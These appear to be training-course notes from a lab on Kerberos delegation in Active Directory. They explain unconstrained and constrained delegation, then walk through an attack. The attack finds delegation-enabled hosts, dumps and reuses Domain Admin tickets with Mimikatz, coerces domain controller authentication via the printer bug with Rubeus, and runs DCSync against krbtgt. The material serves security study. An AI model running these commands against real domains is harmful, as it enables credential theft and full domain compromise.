# Kerberos Delegation

• Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server". 

• This is typically useful in multi-tier service or applications where Kerberos Double Hop is required. 

• For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account. 

• Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.

![[Pasted image 20230106211117.png]]

1. A user provides credentials to the Domain Controller. 
2. The DC returns a TGT. 
3. The user requests a TGS for the web service on Web Server.
4. The DC provides a TGS.
5. The user sends the TGT and TGS to the web server. 
6. The web server service account use the user's TGT to request a TGS for the database server from the DC.
7. The web server service account connects to the database server as the user.

• There are two types of Kerberos Delegation: 

– General/Basic or Unconstrained Delegation which allows the first hop server (web server in our example) to request access to any service on any computer in the domain.
– Constrained Delegation which allows the first hop server (web server in our example) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers Protocol Transition to transition the request to Kerberos. 

• Please note that in both types of delegations, a mechanism is required to impersonate the incoming user and authenticate to the second hop server (Database server in our example) as the user.

• When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user. 

• When unconstrained delegation is enabled, the DC places user's TGT inside TGS (Step 4 in the previous diagram). When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user. 

• This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.

#### Discover domain computers which have unconstrained delegation enabled using PowerView:
```powershell
Get-NetComputer -UnConstrained

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True} 
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

#### Run following command on it to check if any DA token is available: 
```powershell
Invoke-Mimikatz –Command '"sekurlsa::tickets"'
```

#### We must trick or wait for a domain admin to connect a service on appsrv. Now, if the command is run again: 
```powershell
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"' 
```

#### The DA token could be reused: 
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgtDOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

### Coerce Authentication to Computer of Choice

#### We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
(https://github.com/GhostPack/Rubeus) 
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap 
```

#### And after that run MS-RPRN.exe on the student VM:
(https://github.com/leechristensen/SpoolSample)  
```powershell
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

#### Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM: 
```powershell
.\Rubeus.exe ptt /ticket:
```

#### Once the ticket is injected, run DCSync: 
```powershell 
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Learning Objective 17

• Find a server in dcorp domain where Unconstrained Delegation is enabled. 

•Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.


